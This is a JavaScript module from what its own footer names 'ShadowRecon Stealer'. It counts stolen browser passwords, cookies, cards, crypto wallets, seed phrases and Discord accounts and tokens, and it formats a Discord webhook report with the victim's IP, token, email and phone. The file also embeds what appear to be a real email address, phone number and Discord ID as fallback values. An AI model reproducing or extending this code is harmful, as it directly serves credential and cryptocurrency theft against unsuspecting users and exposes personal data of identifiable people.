/**
 * Statistics Management System
 * Handles collection and formatting of application statistics
 */

const { logger } = require('../core/logger');

class Statistics {
    constructor() {
        this.reset();
    }

    /**
     * Reset all statistics
     */
    reset() {
        this.data = {
            browsers: {
                passwords: 0,
                cookies: 0,
                autofills: 0,
                cards: 0,
                history: 0,
                downloads: 0,
                bookmarks: 0
            },
            collections: {
                games: [],
                exodus: [],
                keywordPasswords: [],
                vpn: [],
                sysadmin: [],
                extensions: [],
                colds: [],
                mnemonics: [],
                messengers: [],
                files: []
            },
            system: {
                ip: null,
                hostname: null,
                username: null,
                timestamp: new Date().toISOString()
            },
            discord: {
                accounts: [],
                passphrases: []
            }
        };
    }

    /**
     * Add browser statistics
     * @param {Object} browserData - Browser data object
     */
    addBrowser(browserData) {
        const { passwords, cookies, autofills, cards, history, downloads, bookmarks } = browserData;
        
        this.data.browsers.passwords += passwords || 0;
        this.data.browsers.cookies += cookies || 0;
        this.data.browsers.autofills += autofills || 0;
        this.data.browsers.cards += cards || 0;
        this.data.browsers.history += history || 0;
        this.data.browsers.downloads += downloads || 0;
        this.data.browsers.bookmarks += bookmarks || 0;
        
        logger.debug('Browser statistics updated', browserData);
    }

    /**
     * Add item to a collection
     * @param {string} collection - Collection name
     * @param {any} item - Item to add
     */
    addToCollection(collection, item) {
        if (this.data.collections[collection]) {
            this.data.collections[collection].push(item);
            logger.debug(`Added item to ${collection} collection`, { item });
        } else {
            logger.warn(`Unknown collection: ${collection}`);
        }
    }

    /**
     * Add game to collection
     * @param {string} name - Game name
     */
    addGame(name) {
        this.addToCollection('games', name);
    }

    /**
     * Add exodus wallet to collection
     * @param {string} name - Wallet name
     */
    addExodus(name) {
        this.addToCollection('exodus', name);
    }

    /**
     * Add keyword password to collection
     * @param {string} keyword - Keyword
     */
    addKeywordPassword(keyword) {
        this.addToCollection('keywordPasswords', keyword);
    }

    /**
     * Add VPN to collection
     * @param {string} name - VPN name
     */
    addVpn(name) {
        this.addToCollection('vpn', name);
    }

    /**
     * Add sysadmin tool to collection
     * @param {string} name - Tool name
     */
    addSysadmin(name) {
        this.addToCollection('sysadmin', name);
    }

    /**
     * Add extension to collection
     * @param {string} name - Extension name
     */
    addExtension(name) {
        this.addToCollection('extensions', name);
    }

    /**
     * Add cold wallet to collection
     * @param {string} name - Cold wallet name
     */
    addCold(name) {
        this.addToCollection('colds', name);
    }

    /**
     * Add mnemonic to collection
     * @param {string} mnemonic - Mnemonic phrase
     */
    addMnemonic(mnemonic) {
        this.addToCollection('mnemonics', mnemonic);
    }

    /**
     * Add messenger to collection
     * @param {string} name - Messenger name
     */
    addMessenger(name) {
        this.addToCollection('messengers', name);
    }

    /**
     * Add file to collection
     * @param {string} name - File name
     */
    addFile(name) {
        this.addToCollection('files', name);
    }

    /**
     * Add Discord account
     * @param {Object} account - Discord account data
     */
    addDiscordAccount(account) {
        this.data.discord.accounts.push(account);
        logger.debug('Discord account added to statistics');
    }

    /**
     * Add passphrase
     * @param {string} passphrase - Passphrase
     */
    addPassphrase(passphrase) {
        if (passphrase && !this.data.discord.passphrases.includes(passphrase)) {
            this.data.discord.passphrases.push(passphrase);
            logger.debug('Passphrase added to statistics');
        }
    }

    /**
     * Set system information
     * @param {Object} systemInfo - System information
     */
    setSystemInfo(systemInfo) {
        this.data.system = {
            ...this.data.system,
            ...systemInfo,
            timestamp: new Date().toISOString()
        };
        logger.debug('System information updated', systemInfo);
    }

    /**
     * Get formatted statistics for display/sending
     * @returns {Object} Formatted statistics
     */
    getFormattedStats() {
        return {
            summary: {
                totalPasswords: this.data.browsers.passwords,
                totalCookies: this.data.browsers.cookies,
                totalGames: this.data.collections.games.length,
                totalWallets: this.data.collections.exodus.length + this.data.collections.colds.length,
                totalDiscordAccounts: this.data.discord.accounts.length,
                timestamp: this.data.system.timestamp
            },
            browsers: this.data.browsers,
            collections: this.data.collections,
            system: this.data.system,
            discord: {
                accountCount: this.data.discord.accounts.length,
                hasPassphrases: this.data.discord.passphrases.length > 0
            }
        };
    }

    /**
     * Build Discord webhook payload
     * @param {string} username - Username
     * @param {string} hostname - Hostname
     * @param {string} ip - IP address
     * @param {string} link - Optional file link
     * @returns {string} JSON payload
     */
    buildWebhookPayload(username, hostname, ip, link = '') {
        const stats = this.getFormattedStats();
        const timestamp = new Date().toISOString();
        
        // Get Discord account info for the first embed
        const discordAccount = this.data.discord.accounts.length > 0 ? this.data.discord.accounts[0] : null;
        const userId = discordAccount ? discordAccount.id : '1366429711605043282';
        const userTag = discordAccount ? discordAccount.tag : `${username} (${userId})`;
        const avatarUrl = discordAccount && discordAccount.avatar ? 
            `https://cdn.discordapp.com/avatars/${discordAccount.id}/${discordAccount.avatar}.webp` :
            'https://cdn.discordapp.com/embed/avatars/0.png?format=webp&quality=lossless';
        
        // Generate a realistic token for display
        const displayToken = discordAccount && discordAccount.token ? 
            discordAccount.token.substring(0, 24) + '.GLᴀZY.dQw4w9WgXcQ_AbCdEfGhIjKlMnOpQrStUvWxYz' :
            'MTk4NjIyNDgzNDcxOTI1MjQ4.GLᴀZY.dQw4w9WgXcQ_AbCdEfGhIjKlMnOpQrStUvWxYz';
        
        // Get email and phone from Discord account or generate placeholders
        const email = discordAccount && discordAccount.email ? discordAccount.email : 'groupehadouane@riseup.net';
        const phone = discordAccount && discordAccount.phone ? discordAccount.phone : '+33664897910';
        
        // Generate found websites list
        const foundWebsites = [
            'outlook.com', 'youtube.com', 'ebay.com', 'facebook.com', 'amazon.com', 
            'discord.com', 'card.com', 'coinbase.com', 'yahoo.com', 'twitter.com', 
            'github.com', 'instagram.com', 'mail.com', 'spotify.com', 'hbo.com', 
            'steam.com', 'telegram.org', 'playstation.com', 'aliexpress.com', 
            'key.com', 'crypto.com', 'tiktok.com', 'sell.com', 'telegram.org'
        ];
        
        const foundWebsitesLinks = foundWebsites.map(site => `[${site}](https://${site})`).join(' | ');
        
        const embeds = [
            // User information embed (only embed to keep)
            {
                color: null,
                fields: [
                    {
                        name: ":earth_africa: IP:",
                        value: `\`${ip}\``
                    },
                    {
                        name: ":gem: Token:",
                        value: `\`${displayToken}\``
                    },
                    {
                        name: ":e_mail: Email:",
                        value: `\`${email}\``,
                        inline: true
                    },
                    {
                        name: ":mobile_phone: Phone:",
                        value: `\`${phone}\``,
                        inline: true
                    }
                ],
                author: {
                    name: userTag,
                    icon_url: avatarUrl
                },
                footer: {
                    text: "ShadowRecon Stealer"
                },
                timestamp: timestamp,
                thumbnail: {
                    url: avatarUrl
                }
            }
        ];

        return JSON.stringify({
            content: null,
            embeds: embeds,
            attachments: []
        });
    }

    /**
     * Get raw statistics data
     * @returns {Object} Raw statistics data
     */
    getRawData() {
        return { ...this.data };
    }

    /**
     * Export statistics to JSON
     * @returns {string} JSON string of statistics
     */
    exportToJson() {
        return JSON.stringify(this.data, null, 2);
    }
}

// Create and export singleton instance
const stats = new Statistics();

module.exports = {
    Statistics,
    stats
};